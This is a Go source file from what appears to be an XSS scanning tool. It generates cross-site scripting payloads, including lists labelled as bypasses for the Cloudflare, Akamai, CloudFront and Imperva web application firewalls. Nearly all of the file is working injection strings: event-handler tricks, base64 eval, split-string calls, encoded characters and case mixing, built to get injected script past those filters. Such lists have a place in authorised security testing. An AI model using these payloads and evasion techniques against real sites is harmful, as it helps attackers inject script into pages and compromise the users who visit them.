package payloads

import (
	"bufio"
	"fmt"
	"os"
	"strings"
)

// Generator handles XSS payload generation
type Generator struct {
	smartMode bool
}

// NewGenerator creates a new payload generator
func NewGenerator(smartMode bool) *Generator {
	return &Generator{smartMode: smartMode}
}

// LoadFromFile loads payloads from a custom file
func (g *Generator) LoadFromFile(filepath string) ([]string, error) {
	file, err := os.Open(filepath)
	if err != nil {
		return nil, fmt.Errorf("failed to open payload file: %w", err)
	}
	defer file.Close()

	var payloads []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			payloads = append(payloads, line)
		}
	}
	return payloads, scanner.Err()
}

// GetPayloads returns payloads based on detected WAF
func (g *Generator) GetPayloads(wafType string) []string {
	payloads := g.getBasePayloads()

	switch strings.ToLower(wafType) {
	case "cloudflare":
		payloads = append(payloads, g.getCloudflareBypass()...)
	case "akamai":
		payloads = append(payloads, g.getAkamaiBypass()...)
	case "cloudfront":
		payloads = append(payloads, g.getCloudfrontBypass()...)
	case "imperva", "incapsula":
		payloads = append(payloads, g.getImpervaBypass()...)
	default:
		payloads = append(payloads, g.getAllBypass()...)
	}

	if g.smartMode {
		payloads = append(payloads, g.getSmartPayloads()...)
	}
	return g.deduplicate(payloads)
}

func (g *Generator) getBasePayloads() []string {
	return []string{
		`<script>alert('XSS')</script>`,
		`<script>alert(1)</script>`,
		`<script>alert(document.domain)</script>`,
		`<img src=x onerror=alert('XSS')>`,
		`<img src=x onerror=alert(1)>`,
		`<svg onload=alert('XSS')>`,
		`<svg/onload=alert(1)>`,
		`<body onload=alert('XSS')>`,
		`<iframe src="javascript:alert('XSS')">`,
		`<input onfocus=alert('XSS') autofocus>`,
		`<div onmouseover=alert('XSS')>hover</div>`,
		`<video src=x onerror=alert(1)>`,
		`<audio src=x onerror=alert(1)>`,
		`<details open ontoggle=alert(1)>`,
		`javascript:alert('XSS')`,
		`"><script>alert(1)</script>`,
		`'><script>alert(1)</script>`,
		`" onclick=alert(1) "`,
		`' onclick=alert(1) '`,
	}
}

func (g *Generator) getCloudflareBypass() []string {
	return []string{
		`<svg/onload=&#97&#108&#101&#114&#116(1)>`,
		`<img src=x onerror=\u0061lert(1)>`,
		`<svg onload=eval(atob('YWxlcnQoMSk='))>`,
		`<svg><animate onbegin=alert(1) attributeName=x>`,
		`<script>onerror=alert;throw 1</script>`,
	}
}

func (g *Generator) getAkamaiBypass() []string {
	return []string{
		`<svg/onload=prompt(1)>`,
		`<body/onload=alert(1)>`,
		`<input/onfocus=alert(1) autofocus>`,
		`<marquee/onstart=alert(1)>`,
	}
}

func (g *Generator) getCloudfrontBypass() []string {
	return []string{
		`<img src=x onerror=alert(String.fromCharCode(88,83,83))>`,
		`<svg onload=top[/al/.source+/ert/.source](1)>`,
		`<script>top["al"+"ert"](1)</script>`,
	}
}

func (g *Generator) getImpervaBypass() []string {
	return []string{
		`<svg onload=alert(1)//`,
		`<script>Function("ale"+"rt(1)")();</script>`,
		`<form action=javascript:alert(1)><input type=submit>`,
	}
}

func (g *Generator) getAllBypass() []string {
	var all []string
	all = append(all, g.getCloudflareBypass()...)
	all = append(all, g.getAkamaiBypass()...)
	all = append(all, g.getCloudfrontBypass()...)
	all = append(all, g.getImpervaBypass()...)
	return all
}

func (g *Generator) getSmartPayloads() []string {
	return []string{
		`<SCRIPT>alert(1)</SCRIPT>`,
		`<ScRiPt>alert(1)</sCrIpT>`,
		`<script>eval/**/('alert(1)')</script>`,
		`<script\n>alert(1)</script\n>`,
		`%3Cscript%3Ealert(1)%3C/script%3E`,
	}
}

func (g *Generator) deduplicate(payloads []string) []string {
	seen := make(map[string]bool)
	var unique []string
	for _, p := range payloads {
		if !seen[p] {
			seen[p] = true
			unique = append(unique, p)
		}
	}
	return unique
}
